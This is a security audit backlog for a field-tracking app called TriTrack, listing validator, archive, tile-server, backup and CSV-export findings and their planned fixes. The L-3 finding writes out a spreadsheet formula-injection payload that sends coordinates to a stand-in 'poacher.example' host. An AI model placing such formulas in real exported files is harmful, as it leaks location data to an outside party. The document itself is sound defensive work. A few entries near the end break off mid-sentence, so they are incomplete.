### Task 10.97 — `RowValidator`'s bounds: `NaN`, free text, and one missing `orElse`
**Status:** **Done 2026-08-29 as part of task 11.30 — commit `3a9a2c8`.** M-1, L-7,
N-7 and L-8 are all closed; see 11.30's entry. Do not run `/10-97`. The spec below still applies in full and 11.30 carries it. Merged because
both are **one walk of `tableSpecs` asking a question per column** — 10.97 asks "what
bounds this value?" and 11.30 asks "may this value leave the device?" Same derivation,
same test shape, same file. Answering them in two passes means walking the schema
twice and writing the drift guard twice.
**Model:** Sonnet — the findings are done and the fixes are mechanical, but
**read L-7's widening below before starting**: it is no longer a list of columns.
**Depends on:** nothing. **Not blocking**, and it is no longer small — L-7 grew
from seven named columns to a schema-derived rule after task 11.9. §14.6, §15.4,
§18 (N-7).

Carries **M-1**, **L-7** (widened), **L-8**, and **N-7**, which is L-7 again on a
table that did not exist when L-7 was written.

- **M-1 — `NaN` escapes every numeric bound, on both sides, on every path.**
  Reproduced: `double.tryParse('NaN')` returns NaN, and `v < min`, `v > max`,
  `v <= 0` are each `false` for it. `_num` accepts a **String**
  (`row_validator.dart:341-345`), so `"latitude": "NaN"` in a JSON row reaches
  it — this is not a CSV-only path. It inerts `latLon()`, `bearing()`, the
  four `bbox_*` bounds, `frequency_mhz` and `pulse_rate`. `Infinity` *is*
  caught; `NaN` is not, because it is unordered rather than out of range.
  **Fix the helper, not the call sites** — reject any non-finite value in `_num`
  or in `range`/`positive` themselves, and add a test that walks every numeric
  column of every table with `NaN`, `Infinity`, `-Infinity` and their string
  spellings. Registered below the bar only because no unauthenticated party
  reaches a coordinate *update* (§15.4); it is B4 in every other respect.
- **L-7 — free text has no bound at all.** Measured live with a passing control:
  a 5 MiB `tag_name` is **stored** and returned to every device on the next
  pull; newline, CR, bidi override and the empty string are all accepted. NUL is
  correctly refused, so J-4's typing work holds where it was aimed — this is the
  bound, not the typing. Every text column needs a length cap, a non-blank rule
  where the column is a key (Phase 4 made tag colour the legend key), and a
  control-character rule. Same validator serves the server
  (`sync_service.dart:154`), so one fix covers both sides.
  **Widened 2026-08-21 after task 11.9 (finding N-7). Do not fix a list of
  columns — derive the rule from `tableSpecs`.** This entry used to name seven
  columns by hand: `tag_name`, `notes`, `pulse_pattern`, `antenna_type`,
  `project_name`, `first_name`, `last_name`. Task 11.7 then added a whole table,
  `Observation_Exclusions`, with three more unbounded text columns
  (`observation_id`, `superseded_by_observation_id`, `reason`) that
  `RowValidator` gives no type, shape or length check of any kind, and 11.9
  measured a **1 MB value stored and delivered to every member of the project**.
  That is not a new defect; it is this same finding on a table that did not exist
  when the list was written. **So the fix is a rule every text column inherits,
  and a test that walks `tableSpecs` and fails on any text column with no
  bound** — the same shape as task 11.22, for the same reason: a
  hand-maintained list drifts at the next table and does it silently. The
  standing rule is at `TriTrack_Technical_Context.md`, "Never Write the Number
  of Synced Tables."
  **A caveat for whoever does this, because a blanket cap will break something:**
  the columns are not interchangeable. A tag name and a free-text note want very
  different limits, and the two identifier-shaped columns on the exclusion table
  want an identifier's shape, not a length cap. Derive *that every column has a
  bound* from the schema; choose the bound per column type deliberately, and say
  in the report which columns got which and why.
- **L-8 — an unknown outcome string is an `Error`, not an `Exception`.**
  `SyncRowOutcome.fromDb` is `values.firstWhere(…)` with no `orElse`
  (`sync_protocol.dart:333`), so a `StateError` escapes every
  `SyncTransportException` handler. It is also a forward-compatibility break in
  the opposite direction to `decodeRows`, which deliberately tolerates an
  unknown *table*: the first server release adding a sixth outcome breaks every
  deployed client's push, which is task 10.18's guarantee.

### Task 10.99 — L-9: the archive envelope is unbounded and its manifest is decorative
**Status:** Not started
**Model:** Sonnet
**Depends on:** 10.73. **Not blocking — §15.4 records it as the closest call.**

`BackupArchive.decode` enforces no decompressed size, row count or ratio limit;
a 52 KB zip decoded to 4,000,000 row maps. `manifest.rowCounts` — which
`backup_format.dart:80-81` says is *"used to cross-check the decoded payload
isn't truncated"* — is cross-checked by nothing, and the **pre-import dialog
shows the user the manifest's row counts and project name, both attacker-chosen**
(measured: dialog said "Rows: 3", payload carried 40,000, all inserted). Mass
fabrication is pure insertion, so clause 4 never fires and there is no undo.

- Bound the envelope: decompressed size, row count, and compression ratio.
- **Make the manifest load-bearing or stop showing it.** Either cross-check
  `rowCounts` against the decoded payload and refuse a mismatch, or show the
  user the *decoded* counts. A dialog quoting the attacker is worse than one
  quoting nothing.
- A zip carrying two `manifest.json` entries resolves to the second while
  `unzip -l` shows both — refuse duplicate entry names outright.

### Task 10.107 — M-6/M-8: what a third-party tile server can put in the field record
**Status:** Not started. **Downgraded further by Michael on 2026-08-30, with a reason
worth keeping: a wrong elevation is recoverable and a wrong position is not.** Every
observation stores its own latitude and longitude, so anybody post-processing a season's
data can look the elevation up again from a better reference. **The elevation in the
record is a convenience, not the primary measurement** — which is what makes this a
below-the-bar finding rather than a data-integrity one, and it is a better reason than
the one previously written here. Michael also confirmed the ordinary accuracy ranking is
not in dispute: a terrain lookup normally beats a phone's own altitude, and nothing here
argues otherwise. **What remains worth doing is only the cheap half** — refuse a tile
that does not decode, and reject values outside plausible bounds — because that failure
is *unbounded* where ordinary error is merely noisy. Hours, no change to which source is
preferred. **Stays below the line.**
**Model:** Sonnet
**Depends on:** nothing. **Not blocking.** §15.4. Closes inventory item 11.

Verified end to end by reading, and this is the part that matters: elevation
PNG pixels from `s3.amazonaws.com` become a `NOT NULL` column in the field
record and are **preferred over the device's own GPS altitude by explicit
design comment** — `terrain_tile_source.dart:23-28` → `dem_tile_fetcher.dart:76`
→ `dem_tile_store.dart:204` → `observation_logging_screen.dart:467-468` →
`schema.dart:139`, then out through CSV export and the sync push to every
teammate. Below the bar because reaching it adversarially means defeating TLS,
**and the non-adversarial half needs no attacker at all.**

- **Sanity-bound the parsed elevation.** Nothing clamps `elevationAtPixel`'s
  ≈`[-32768, +32768]` m range between the pixel and the column. Reject
  implausible values and say so.
- **Add a timeout and a response-size limit** to all three third-party calls
  (`cached_tile_provider.dart:77`, `offline_tile_downloader.dart:198`,
  `dem_tile_fetcher.dart:97`). There is currently neither, at 6-way concurrency
  on the bulk path.
- **Stop writing before validating.** `cached_tile_provider.dart:84-85` caches
  the bytes *before* proving them decodable, and nothing ever revalidates — so a
  single bad `200` (captive portal, mis-serving mirror) persists permanently and
  is served from disk forever after. Same shape in `offline_tile_downloader.dart:199-202`,
  which writes whatever a `200` carried into a file named `.png`.
- **M-8 — the `https` guarantee is four unguarded string literals.** Tile and
  DEM traffic uses plain `dart:io` `http`, not `createPlatformHttpClient()`, so
  on iOS/macOS it is outside ATS governance entirely. **Do not re-route
  `flutter_map`'s provider** — add a test asserting every tile and DEM template
  is `https://`, and record in §4.1 that this traffic is outside ATS by
  construction.
- Elevation does **not** enter a position estimate — Lenth MLE and bearing
  intersection are 2-D (verified) — which bounds the blast radius to the stored
  record, the viewshed and the profile chart. Say so in the fix rather than
  leaving the next reader to re-derive it.

### Discovered Scope

#### From task 10.87 (2026-09-13)

- **The import receipt's refusal list is the fifth instance of the one-item-per-record class, and
  it was left as it is.** `ImportReportContent` lists the first 20 refused rows and says how many
  more, in `syncTables` declaration order — the same cut point L-5 was about, at lower stakes: a
  refusal is the file *failing* to write, so what a padded list could hide is that the file tried
  something (an out-of-range clock, another project's row), not a change to the person's data.
  Grouping it per table the way the consent dialog now is would cost one afternoon; the planning
  session decides whether a receipt of refusals is worth it.
  **DECIDED 2026-09-13: accepted, not a task, with a trigger written down so it is not re-decided
  by guess.** The reasoning the task gave is the reasoning that settles it — **a refusal is the file
  failing to write**, so a padded list hides *that the file tried something*, never a change to the
  person's data. Nobody reads an import receipt adversarially today, and there is no flow in which
  a decision is made from that list. **The trigger: the moment anything asks a person to act on the
  refusal list — a review flow, a security procedure, a support instruction — this becomes a task**,
  because at that point the file would be choosing what the person acts on, which is L-5 exactly.
  **Four of five fixed and the fifth accepted with a named condition is a closed class, not a
  loose end.**
- **A v13 archive of a project whose collar was later forked on the importing device re-creates
  the pre-fork tag id in that project.** Not a dangling-id case (the v15 step is about a v14
  archive), so not this task's item, and not measured against a database — reasoned from the
  `Tags` primary key `(tag_id, project_id)`: the archive's `Tags` row arrives keyed `(t1, B)`, the
  device holds `(t2, B)` with `lineage_id = t1`, and both survive as two tags for one collar in
  project B. `SchemaMigrator`'s v14 comment says the fork "cannot arise in an archive at all", which
  is true of the archive alone and not of the archive meeting a forked device. **Needs a task with a
  database test before anybody acts on it**; the guess is a duplicate tag, not a lost record.
  **Given a number 2026-09-13: task 11.239**, whose **first step is that database test** and whose
  brief says in so many words that **one tag is a clean negative and ends the task.** Ranked below
  the line *provisionally*, with the ranking to be re-decided on the measured answer — **if it
  reproduces it is a duplicate collar in a scientific record, reachable on Michael's own device**,
  which is an above-the-line argument. **The `SchemaMigrator` comment gets its missing half either
  way.**

#### From task 10.106's triage (2026-08-16) — accepted risks with an engineering tail

These are **accepted** in the register (§15.3). They block nothing and are not
security work. They are recorded here because acceptance disposed of the *risk*,
not of the *defect*, and the next person to touch these files should know.

- **L-11 — the WMM expiry guard is dead code, and the parser's loudness claim is
  false.** `WmmService.isDateInValidRange` (`wmm.dart:84`) has no call site in
  `lib/`, so past the model's 2030.0 expiry every bearing is silently
  extrapolated, contradicting its own doc comment. And
  `wmm_coefficients.dart:44-45` claims the parser *"fails loudly rather than
  silently mis-computing bearings"* — a truncated `.COF` keeping two coefficient
  lines parsed without error and moved declination by 2.13° (≈74 m cross-track
  at 2 km); a sign-flipped `g(1,0)` also parsed without error.
  **Accepted as a security finding because the `.COF` is a build-time asset with
  no runtime substitution path — there is no adversary.** The acceptance is void
  the day anyone swaps in WMM2030, which `wmm.dart:20-22` explicitly invites.
  **Fix it before that swap, not after.**
- **L-14 — `file_picker: ">=12.0.0-beta.1"`** (`pubspec.yaml:63`) is the only
  unbounded constraint in either tree, on the package through which every
  hostile `.zip` and every hostile CSV arrives. Accepted because `pubspec.lock`
  is committed, so the resolved version is pinned for every build and the
  constraint bites only on a deliberate `pub upgrade`. **Add a ceiling the next
  time this file is touched for any reason.**

#### From task 10.79 (2026-09-09)

- **The same class L-10 named on Android is real on iOS and macOS too, and
  nothing in the security model had ever named it.** L-10 was "Android Auto
  Backup copies the whole sandbox — `tri_track.db` included — to the user's
  Google account, and §3.7 never names the platform backup channel." The class
  is broader than the one platform it was filed against: **any OS-level
  device-backup mechanism that copies the app sandbox off-device outside a
  TriTrack decision** is the same finding. Enumerated per platform:
  - **Android** — fixed in this task: `android:allowBackup="false"` in
    `android/app/src/main/AndroidManifest.xml`.
  - **iOS** — `tri_track.db` lives in `getApplicationSupportDirectory()`
    (`lib/data/db/app_database.dart`), which iOS backs up to iCloud (device
    backup) or a Finder/iTunes local backup **by default**, unless the
    specific file is marked with the `NSURLIsExcludedFromBackupKey` resource
    value. Nothing in this repository sets that value on any file. **Real,
    undocumented until now, and not fixed here** — it needs a small native
    (Swift) implementation behind a new platform channel, which this task's
    own scope ("a platform capability check, a manifest attribute, a one-time
    warning") did not anticipate, and which cannot be verified without a real
    device or simulator backup/restore cycle — a different verification
    method than the rest of this task.
  - **macOS** — different threat model, not the same finding: the OS-level
    backup mechanism is Time Machine, which requires the user to attach and
    configure their own backup destination (typically a drive that travels
    with the machine, unlike an automatically-linked cloud account), and this
    app's sandboxed container is not swept by iCloud Drive's Desktop/Documents
    sync since it lives outside those folders. **No fix proposed for macOS**;
    say so explicitly rather than leaving the platform unmentioned.
  **Reserved: task 11.214** — the iOS exclusion. One task rather than folding
  it into another 10.7x item, because it needs its own native-code
  verification step (a real backup/restore, not a unit test) that nothing
  else in Phase 10's remaining items requires.
- **Security Model §4.8's own doc comment reference (`lib/data/auth/session_store.dart`)
  claimed both the iOS/macOS Keychain and Android Keystore-backed storage were
  "gated on the device passcode."** Neither actually requires one — the OS
  provides the store either way; a passcode only keys the *file-based/full-disk
  encryption layer* §4.8 depends on. Corrected in the same commit as this
  task's other changes.

#### From task 10.75 (2026-08-16)

- **A shared-mailbox device ends up with two profiles and no explanation.**
  10.75 stopped fusing two people who share an institutional address, which is
  the right outcome, and `IdentityAdoptionReport.heldBack` names the users it
  declined to fold in — **and no screen renders it.** Nothing is lost (the held
  rows are untouched, which is the whole point), but the person signing in sees
  a second profile they did not expect and is told nothing about why it is
  there or how to merge it if the two really are the same person. Needs a
  post-sign-in surface, and probably a merge affordance. Recorded in §4.20's
  "what this does not claim" as a named residual rather than a closed question.
  Small; not gate-blocking; wants a UI decision more than a security one.

#### From task 10.110's class sweep (2026-08-19)

10.110's defect class, stated so the sweep can be checked against it: **an
instrument simulates an actor that is off-host in the deployment being reasoned
about, using a mechanism on the host, and the validity of that substitution
depends on the host platform's network topology without being checked at run
time.** Every instrument in `scripts/` and `server/backup/` was read against
that question. Two carry it. **Verdicts are recorded below for all of them,
including the ones that are fine** — a sweep that lists only its hits reads,
six weeks later, exactly like a sweep that found everything.

**Reserved: task 10.111** — one task, both instances, because two tasks on one
shape drift apart (10.86's reasoning, and K-1's).

- **`verify_c3_cleartext_defaults.py:165-177`.** `lan_address()` is documented
  as *"the one a phone on the Wi-Fi would use"*, and then the connection is
  opened **from the host itself**. The conclusion printed at `:197-198` is
  *"the shipped compose defaults reach this host only"* — a claim about
  off-host callers, measured with an on-host socket. A host-originated
  connection to the host's own LAN address traverses `nat/OUTPUT`; a real
  off-host caller traverses `nat/PREROUTING`. Docker installs DNAT in both, so
  the two usually agree — *usually* is the word doing the work, and nothing in
  the file checks it or says so.
- **`gate_c_adversarial_pass.py:252-273` (check A4).** Same substitution, and
  the check's own title says *"reach the diagnostics console **off-host**"*.
  It has a second, Linux-specific arm: `socket.gethostbyname_ex(socket.
  gethostname())` returns `127.0.1.1` on a stock Debian/Ubuntu host, the
  `not a.startswith("127.")` filter at `:254` empties the list, and A4 becomes
  `skipped_check`. Partially contained — skips are tracked and evaluated
  against the baseline (`:982-984`), so the degradation fails loud rather than
  passing quiet. That containment is why this is the lesser of the two.
- **The direction is the opposite of 10.110's, and it is the worse one.**
  10.110 failed *closed*: wrong, but in the refusing direction, so no host
  could be licensed. These two fail *open* — the verdict they can produce
  wrongly is "unreachable", which is the reassuring one, printed as a closed
  finding.
- **Two instruments already handle this class correctly and are the pattern to
  copy rather than reinvent.** `verify_i1_source_identity.sh:104-113` declares
  its stand-in's limit in machine-readable form
  (`TRITRACK_PROXY_SOURCE_IDENTITY="on-network-only"`) and names the instrument
  that answers the question it cannot. `verify_tls_termination.sh:189-217` asks
  `docker compose port` whether a port is published instead of inferring it
  from a failed connection, and treats "could not ask" as absence of evidence
  rather than evidence of absence.
- **Verdict SOUND, with the reason, for everything else read:**
  `verify_i1_source_identity.sh` (containers stand in for two attackers, but
  they reach Caddy over the compose bridge and cross no publish path — the
  substitution is declared and bounded); `verify_tls_termination.sh`;
  `verify_c3_cleartext_defaults_stack.sh` (lifecycle wrapper only — it inherits
  the Python check's defect and adds none); `verify_ats_transport_security.sh`
  (macOS-only by design, and a wrong `ipconfig getifaddr en0` makes the
  integration test *fail* rather than pass); `verify_h6_archive_forgery.sh` and
  `backup_restore_drill.sh` (their adversary is a write-only *filesystem*
  actor, which genuinely is on the host); `gate_wire.py` and the six wire
  instruments (`verify_c1`, `verify_c2`, `verify_c5`, `verify_d1`,
  `verify_h3`, `verify_i4` — the modelled attacker is a credential holder on
  another account, a question of authorization and not of network position);
  `gate_c_baseline.py` and `verify_instrument_unchecked_returns.py` (static, no
  sockets); `gate_smoke_test.sh`, `run_offline_suite.sh`, `backup_db.sh`,
  `restore_db.sh`, `run_server_tests_docker.sh`; `server/backup/backup.sh` and
  `restore.sh` (production tooling, filesystem-local adversary throughout).

#### BLOCKING — Security Gate C, seventh re-run (task 10.25, 2026-08-16)

*Full evidence in `TriTrack_Security_Model.md` §14. Every item below leaves this
session with a task number, per §13.12's clause. None of the three is on the
server: the sync interface came back clean for the third consecutive round.*

*On the numbers: 10.92–10.105 are **reserved here**, one per finding, so that no
verdict leaves this gate undescribed and unowned. Writing the full `### Task`
entries — ordering, model choice, dependencies — is the planning session's call,
not this one's. The evidence each entry needs is in §14 and below.*

- **L-1 — the source-identity startup refusal does not fire on an allowlist that
  parses to zero entries (§14.2). Blocking. → task 10.92.**
  `TrustedProxies.fromEnvironment` (`server/lib/src/security/trusted_proxies.dart:286-290`)
  takes the allowlist branch on any non-empty, non-`none` value, asks 10.74's
  question only `if (!allowlist.isEmpty)`, and returns before the block that
  would have demanded `peer-verified` of a reachable deployment. `parse` skips
  empty entries (`:234`), so `,` is non-empty and parses to nothing. Measured
  live with three passing controls: unset → 78, whitespace → 78, real allowlist
  with no declaration → 78, `,` → **starts and listens**. Downstream, an empty
  allowlist means `X-Forwarded-For` is never read, so every caller keys on the
  TCP peer — which this run's own probe measured as one gateway address for two
  distinct off-host callers. That is I-1 verbatim, reached silently. **This is
  the only thing closing K-2, last round's blocking finding.** Fix is two lines:
  treat a non-empty value that parses to zero ranges as malformed, and key the
  second question on "an allowlist was declared," not on "it has members." Add
  the case to `trusted_proxies_test.dart`'s K-2 group, beside the sibling test
  that already names this exact failure mode in its comment.
- **L-2 — a consent-free `revision` write makes an observation permanently
  unrestorable (§14.3). Blocking; the most urgent item in the phase. → task 10.93.**
  §4.19 clause 3 bounds `revision` at `maxRevision` (4,000,000,000, checked with
  `>`, so the ceiling is legal); clause 4 exempts `revision` from the consent
  diff via `columnsMovedByEveryEdit`. An archive identical to the local row
  except for `revision` therefore applies with `changes=0 destructive=0
  issues=0` and **no dialog**. One honest edit later — `base_repository.dart:257`
  is `revision = revision + 1` — the row exceeds the bound, and the user's own
  project export **refuses to restore it on a replacement device**
  (`refused=1, rows present=0`), while `_showMergeReport` renders the count and
  never `report.issues`. Second harm, no edit needed: every genuine later
  correction is discarded as "local was newer." Nothing bounds `revision`
  server-side either, so a poisoned row propagates to every teammate. The design
  question to answer, not just the bug: an exemption criterion of "moves on every
  honest edit" is sound for a column the merge *ignores* and unsound for one the
  merge *reads* — `revision` is both clause 3's bounded quantity and the
  ordering key. Consider bounding the *delta* rather than the absolute value, or
  showing exempt-column changes when they are the only changes.
- **L-3 — every exported CSV is an execution primitive on the recipient's
  machine, and the coordinates sit in the same row (§14.4). Blocking. → task 10.94.**
  `observation_csv.dart:88`, `tag_csv_export.dart:41` and
  `non_detection_csv.dart:70` all call `Csv().encode(rows)` with no
  formula-prefix neutralization anywhere in the repository. Reproduced against
  the real encoders: `tag_name` went out as
  `=WEBSERVICE("http://poacher.example/?p="&TEXTJOIN(",",1,H2,I2))` with
  `latitude` at column H and `longitude` at I; `observer_name` went out as
  `=1+1 Researcher` unquoted; the tag roster carried a DDE payload in `notes`.
  Reachable from outside the team — planting a tag needs no consent because
  inserting isn't destructive — so this is not §5.2's authorized-insider case and
  not §5.7's exported-data case: the harm is the file *executing*. Fix the class
  across all three encoders, and add the import-side fidelity gap with it (L-15:
  `tag_csv_import.dart:161-166` silently substitutes a palette colour for an
  invalid `color_hex` and reports "0 skipped", on the field Phase 4.4 made the
  map legend key).
- **The NAU information-security review — carried ×7, and materially wrong until
  this gate (§14.13).** `NAU_infosec_review_request.md` was last touched at
  `fa74a85`, and that revision changed the preamble only: the body still said the
  assessment had failed five times and presented the *fourth* round's findings as
  the most recent, with **J-1 and K-1 absent entirely.** Rewritten this round —
  the untrusted-import class is now the headline, §14.12 is the pointer, the
  closed items are stated as closed, and Android platform backup (L-10) is added
  as a policy question. Recipient still blank; **still not sent**; still the one
  item engineering cannot close.

#### Non-blocking, from the seventh re-run (task 10.25, 2026-08-16)

*Full evidence in `TriTrack_Security_Model.md` §14.6–§14.9. Each has an owning
task number.*

- **L-4 — 10.91's baseline cannot do what its acceptance criterion promised.
  → task 10.95.** `gate_c_baseline.py:43-46` keys on the leading token of a check
  name, and that token space is already colliding in the file it indexes: `Cd`
  names three checks, `Ea`/`A1`/`A2` two each. A future second `Dc …` failing for
  a new reason is absorbed — token baselined, kind still `failed`, so none of the
  three detectors fire and the pass exits 0. The citation check is a keyword
  regex over the *whole* cited section and never looks for the entry's own
  `finding_id`, so §8.4 (521 lines, six accepted-word hits) blesses anything.
  And `evaluate()` is never told how many checks ran, so a check lost in a
  refactor is silent. Key on the full check name, assert token uniqueness at
  load, require the citation to name the finding, floor the check count, and
  register `--selftest` in `gate_smoke_test.sh`. *This did not change this run's
  verdict — the four failures were read by name — but the mechanism did not
  establish that, the gate did.*
- **L-6 — K-1 fact (d)'s count is reported as zero exactly when it matters.
  → task 10.96.** `data_export_screen.dart` calls `merge()` twice on the same
  `ProjectBackup`; pass 1 rewrites the incoming rows in place, so pass 2's remap
  is empty and `rowsReattributed`/`usersDeduped` are 0. Only pass 2's report
  reaches `_showMergeReport`, and both lines are `if (… > 0)`. The dedup count
  §4.19.2 says the path owes appears on a benign import and vanishes on a hostile
  one. Also causes `SchemaMigrator` steps to re-run on already-migrated rows.
- **L-7 — `RowValidator` bounds identifiers and stops at free text, on both
  sides. → task 10.97.** Measured against the live server with a passing control:
  a **5 MiB `tag_name` is accepted and stored**; newline/CR, a bidi override and
  an empty string are all stored; a NUL byte is correctly refused. `tag_name`,
  `notes`, `pulse_pattern`, `antenna_type`, `project_name`, `first_name` and
  `last_name` have no length bound, no non-blank check and no control-character
  rule. Not an untyped 500 — this is the bound, not the typing.
- **L-8 — an unknown sync outcome is an `Error`, not an `Exception`. → task 10.98.**
  `SyncRowOutcome.fromDb` (`sync_protocol.dart:333`) is `firstWhere` with no
  `orElse`. Reproduced: a valid envelope carrying `"held"` throws
  `StateError: Bad state: No element`, which escapes every
  `SyncTransportException` handler because it is not an `Exception`. It is also a
  forward-compatibility break in the opposite direction from `decodeRows`, which
  deliberately tolerates an unknown table: the first server release adding a
  sixth outcome breaks every deployed client's push.
- **L-9 — the archive envelope is unbounded and its manifest is decorative.
  → task 10.99.** `BackupArchive.decode` enforces no decompressed-size, row-count
  or ratio limit (a 52 KB zip decoded to 4,000,000 row maps). `manifest.rowCounts`
  — documented at `backup_format.dart:80-81` as the truncation cross-check — is
  checked by nothing, while the pre-import dialog shows the user the manifest's
  row count and project name, both attacker-chosen (dialog said "Rows: 3";
  40,000 landed). Mass fabrication is pure insertion, so clause 4 never fires and
  there is no undo. A zip with two `manifest.json` entries resolves to the second.
- **L-10 — `android:allowBackup` is absent and therefore true. → task 10.100.**
  Nothing under `android/` sets `allowBackup`, `dataExtractionRules` or
  `fullBackupContent`. §4.8's decision not to encrypt the local database rests
  entirely on the OS sandbox; Android Auto Backup is that sandbox's documented
  exit, copying `tri_track.db` and every coordinate in it to the user's Google
  account. §3.7 never names the platform backup channel. Decide iOS/iCloud device
  backup at the same time; the NAU letter now asks about both.
- **L-11 — the WMM expiry guard is dead code and the parser's loudness claim is
  false. → task 10.101.** `WmmService.isDateInValidRange` (`wmm.dart:84`) has no
  call site in `lib/` — only tests — so past the model's 2030.0 expiry every
  bearing is silently extrapolated. And a truncated `.COF` keeping two
  coefficient lines parsed without error and moved declination 2.13° (≈74 m
  cross-track at 2 km); a sign-flipped `g(1,0)` also parsed. Not
  attacker-reachable while the `.COF` is a bundled asset; it arms the day someone
  accepts `wmm.dart:20-22`'s invitation to drop in WMM2030.
- **L-12 — `end_date` is a second deactivation column the destructive predicate
  doesn't know. → task 10.102.** `UntrustedImportRules.isDestructiveChange`
  enumerates `deleted_at` by hand. Reproduced: an archive setting
  `Project_Memberships.end_date` applies with `destructiveChanges=0` and no
  dialog, and the local membership predicate then returns zero rows; the same row
  with `deleted_at` correctly needs confirmation. **Bounded** — the server refuses
  the row (§14.8), so this stops at the device. Fix the class: derive the
  predicate from a declared set, the way clause 2 derives from
  `SyncTable.identityUserColumns`.
- **L-13 — instrument residue, and three fixes that closed the instance.
  → task 10.103.** `backup_restore_drill.sh:764` reads "I could not look" as
  "confirmed clear" — reproduced with a control, pointed at a nonexistent
  directory it passes — and `verify_instrument_unchecked_returns.py` cannot see
  it, because `SWALLOW_ASSIGN` requires a variable assignment and one physical
  line. `throwsA(anything)` survives at `test/data/sync/project_merger_test.dart:505`
  (guarding **K-1's own merge path**) and `test/data/sync/project_joiner_test.dart:65`.
  K-3's deep-link fix reached `AndroidManifest.xml` and `ios/Runner/Info.plist`
  but not `macos/Runner/Info.plist`, which ships. K-7 remains open under task
  10.82 (`verify_c3_cleartext_defaults.py` still unregistered in
  `gate_smoke_test.sh`). Minor: `GATE_SMOKE_SELFTEST=1` restores `gate_wire.py`
  from a `mktemp` copy via an `EXIT` trap rather than from git — it worked here
  and the tree was clean after, but a `SIGKILL` would leave the stale constant.
- **L-14 — one open-ended dependency, on the package owning both untrusted-file
  entry points. → task 10.104.** `file_picker: ">=12.0.0-beta.1"`
  (`pubspec.yaml:63`) is the only unbounded constraint in either tree: a
  pre-release with no ceiling, on the package through which every hostile `.zip`
  and every hostile CSV arrives. Everything else is a caret range or an exact
  pin, all from pub.dev, no git sources. Pin it and record what it is trusted
  with, per this phase's standing dependency criterion.
- **L-5 — the consent dialog shows 40 of N in an order the archive chooses.
  → folded into task 10.87, whose brief needs correcting.**
  `data_export_screen.dart:281-282` caps at 40, and `_plan` emits changes in
  `syncTables` order, where `Observations` is fifth — after `Users`, `Projects`,

  unconditional, so this is visibility, not permanence — but 10.87 currently

  finding**: the cut point is attacker-orderable. Sort destructive changes by

- **L-16 — the default suite is intermittently red. → task 10.105.** Three full
  `flutter test` runs this session: green (898/9), **red** (897/9, one failure —
  `test/features/map/map_screen_test.dart`, "live tag-color update … editing a
  tag color updates the map live, without an app restart"), green (898/9). The
  file passed 3/3 in isolation, so the failure is order- or
  concurrency-dependent inside the full run. Not a security test — but task
  10.51 gates the entire gate run on this suite being green, and a suite that is
  red one run in three will eventually be green on the run that mattered. That

- **Carried, with owners:** K-4's residuals — `User_Emails.user_id` is the one

#### BLOCKING — Security Gate C, sixth re-run (task 10.25, 2026-08-16)

*Full evidence in `TriTrack_Security_Model.md` §13. Both items were already in
that document as open before this gate ran; see §13.12 on why that is the
finding rather than an excuse.*

- **K-1 — the picked-`.zip` backup restore reproduces J-1 on every table
  (§13.2). Blocking; the most urgent item in the phase.** `FilePicker` →
  `BackupArchive.decode` → `ProjectMerger.merge` takes `user_id`,
  `owner_user_id`, `last_modified_by`, `origin_device_id`, `revision`,
  `created_at`, `updated_at` and `deleted_at` verbatim from the file, on all 11
  synced tables, with no prior-version capture and no field-by-field diff.
  Reproduced live under the **default** `lastWriteWins` strategy with
  `validate: true`. **Four things the task must not get wrong**, each measured
  in the gate rather than assumed: (a) `preferIncoming` is not the defect — an
  unbounded `revision` wins `MergeResolver` outright, so removing the
  "Overwrite with backup" button fixes nothing; (b) `RowValidator` already runs
  here and stops none of it, because it has never inspected the clock,
  `deleted_at` or authorship; (c) the merge is not scoped to
  `manifest.projectId` — one file rewrote the owner of an unrelated local
  project; (d) `IdentityTrust.emailMatchesPerson` is in force, so a `Users` row
  claiming the victim's address re-attributes the file's own rows to the victim.
  §4.19's five clauses are the design answer already written down; the work is
  applying them to a path that reaches every table rather than one row.
  **Closed by task 10.73, 2026-08-16** — see §4.19.2 and that task's entry.
  **Also fix the exposure claim, not just the code:** §4.19.1's deferral rests
  on "a file the user chose," and `data_export_screen.dart:70-72` tells users
  the file is shareable by WhatsApp. **Model: Opus** — same class as 10.61, and
  the rule has to extend rather than be re-derived.
- **K-2 — no per-source rate limit in the deployment §4.1 mandates (§13.3).
  Blocking.** `scripts/verify_source_identity.sh`, run as a gate rather than
  `--report-only`, returns COLLAPSED for the TLS overlay's off-host callers with
  its negative control passing in the same run. §4.4's limits become one bucket
  for every user and `auth_audit_log.source_address` names a gateway — finding
  I-1, in the only shape this project is allowed to expose. 10.62 closed the
  base/LAN shape properly (verified: exit 78); this is the remainder §12.4
  measured and filed rather than scheduled. **This is a deployment decision, not
  a patch.** The probe's own text is likely right that no Docker Desktop
  configuration fixes it, so the honest options are: qualify the exposable
  deployment as Linux-host-only and require a passing
  `verify_source_identity.sh` run before exposure, or find a publish path that
  preserves addresses on this host, or accept the collapse explicitly with the
  per-email fallback carrying the whole load and say so in §4.4.2. **No fourth
  option, and "it might be fine on Linux" is not one of the three** — nobody has
  measured a Linux host. **Model: Opus.**
- **The NAU information-security review — carried at six consecutive gates.**
  Not engineering work and cannot be closed by any task here. The letter is
  repointed at §13.10; the recipient field and the send are the whole of what
  remains.

#### Non-blocking, from the sixth re-run (task 10.25, 2026-08-16)

- **K-3 — §4.19.1's deep-link row and `splash_screen.dart:44-45` are both false
  as written (§13.6).** The row's four sub-claims hold; its conclusion does not.
  `android/app/src/main/AndroidManifest.xml:16` is `android:exported="true"`, so
  any app on the device can start the activity with an explicit component
  intent carrying a `route` extra; `FlutterActivity.getInitialRoute()` returns
  it unconditionally and go_router 17.3.0 prefers the platform default over
  `initialLocation` unless `overridePlatformDefaultLocation: true`, which this
  app does not set. Reproduced at hops 2–3 with a negative control. Bounded by
  §5.4 (a malicious app on the device is a non-goal), so the *exploit* is
  accepted — but the **claims** need correcting and the fix is three lines:
  `overridePlatformDefaultLocation: true` (or a `redirect:` re-asserting the
  identity gate), plus `flutter_deeplinking_enabled=false` /
  `FlutterDeepLinkingEnabled=false` so the iOS receiver is not armed by default.
  **Do the iOS half before Phase 11 adds any magic-link deep link** — today iOS
  is closed only by the absence of a registered URL type, which is one layer.
- **K-4 — `ServerIdentityAdopter` takes an unvalidated server-chosen `user_id`
  and hard-deletes on it.** Written into a primary key, into the user column of
  all 11 synced tables including `Projects.owner_user_id`, into a `User_Emails`
  binding and into the device's acting identity, each with `revision + 1`; the
  superseded local `Users` row is `DELETE`d with no `Sync_Conflicts` entry, no
  tombstone, and its profile preserved only on one branch. No `RowValidator`, no
  authorization check. Needs a hostile or compromised server (or a debug build
